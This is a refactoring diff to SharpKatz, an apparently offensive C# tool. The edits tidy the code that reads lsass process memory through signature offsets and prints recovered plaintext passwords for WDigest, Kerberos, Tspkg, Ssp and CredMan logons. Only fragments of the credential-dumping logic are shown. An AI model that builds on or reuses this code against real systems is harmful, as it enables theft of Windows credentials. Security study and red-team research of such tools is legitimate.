@@ -46,7 +46,7 @@ namespace SharpKatz
         public static ulong OffsetFromSign(string modulename, byte[] sign, long max_search_size)
         {
             IntPtr moduleLocal;
-            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
+            // Load dll locally to avoid multiple ReadProcessMemory calls into lsass
             moduleLocal = Natives.LoadLibrary(modulename);
             if (moduleLocal == IntPtr.Zero)
             {
@@ -79,10 +79,8 @@ namespace SharpKatz
 
             tmp_p = IntPtr.Add(msvMem, tmp_offset);
             byte[] listAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
-            IntPtr listAddr = new IntPtr(BitConverter.ToInt64(listAddrBytes, 0));
-
-            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
-            return listAddr;
+            
+            return new IntPtr(BitConverter.ToInt64(listAddrBytes, 0));
         }
 
         public static int GetInt(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
@@ -104,10 +102,8 @@ namespace SharpKatz
 
             tmp_p = IntPtr.Add(msvMem, tmp_offset);
             byte[] intAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
-            int intval = BitConverter.ToInt32(intAddrBytes, 0);
-
-            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
-            return intval;
+            
+            return BitConverter.ToInt32(intAddrBytes, 0);
         }
 
         public static IntPtr GetListAdress(IntPtr hLsass, IntPtr msvMem, string modulename, long max_search_size, int listOffset, byte[] sign)
@@ -312,9 +308,7 @@ namespace SharpKatz
                         Console.WriteLine("[*]\t  Password : {0}", logon.Tspkg.Password);
                         Console.WriteLine("[*]");
                     }
-                    
-                    
-                    
+
                     if (logon.Wdigest != null)
                     {
                         Console.WriteLine("[*]\t WDigest");
@@ -323,9 +317,7 @@ namespace SharpKatz
                         Console.WriteLine("[*]\t  Password : {0}", logon.Wdigest.Password);
                         Console.WriteLine("[*]");
                     }
-                    
 
-                    
                     if (logon.Kerberos != null)
                     {
                         Console.WriteLine("[*]\t Kerberos");
@@ -334,9 +326,7 @@ namespace SharpKatz
                         Console.WriteLine("[*]\t  Password : {0}", logon.Kerberos.Password);
                         Console.WriteLine("[*]");
                     }
-                    
 
-                    
                     if (logon.Ssp != null)
                     {
                         Console.WriteLine("[*]\t Ssp");
@@ -350,9 +340,7 @@ namespace SharpKatz
                         }
                         Console.WriteLine("[*]");
                     }
-                    
 
-                    
                     if (logon.Credman != null)
                     {
                         Console.WriteLine("[*]\t CredMan");
